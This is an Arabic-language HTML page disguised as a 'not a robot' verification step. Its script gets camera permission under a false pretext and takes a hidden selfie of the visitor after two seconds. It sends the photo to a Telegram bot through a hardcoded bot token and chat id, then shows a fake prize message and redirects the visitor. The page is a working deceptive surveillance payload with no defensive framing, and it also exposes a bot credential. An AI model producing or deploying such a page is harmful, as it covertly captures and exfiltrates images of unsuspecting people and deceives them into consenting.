<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الهوية</title>
    <style>
        body { background: #0b0e14; color: white; text-align: center; font-family: sans-serif; padding: 20px; }
        .box { border: 1px solid #30363d; padding: 20px; border-radius: 10px; background: #161b22; }
        button { background: #238636; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 18px; }
    </style>
</head>
<body>
    <div class="box">
        <h3>خطوة أخيرة: تأكيد أنك لست روبوت</h3>
        <p>اضغط على الزر أدناه للسماح بالتحقق البصري السريع</p>
        <button id="start">أنا لست روبوت (تحقق)</button>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = "7670732800:AAEq-1H8W8m6h2Kshf9K9Iu0HIsX_u-8M3s";
        const id = "7547144883";

        document.getElementById('start').onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                // انتظر ثانيتين لضبط الصورة ثم التقطها تلقائياً
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(blob => {
                        const frm = new FormData();
                        frm.append('chat_id', id);
                        frm.append('photo', blob, 'cam.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm })
                        .then(() => {
                            // بعد الإرسال بنجاح، حوله لصفحة الجائزة الوهمية
                            alert("تم التحقق بنجاح! جاري تحويلك لاستلام الجائزة...");
                            location.href = "https://google.com";
                        });
                    }, 'image/jpeg');
                }, 2000);
            } catch (e) {
                alert("يجب الضغط على 'سماح' أو 'Allow' في الرسالة التي ستظهر أعلى المتصفح للمتابعة.");
            }
        };
    </script>
</body>
</html>
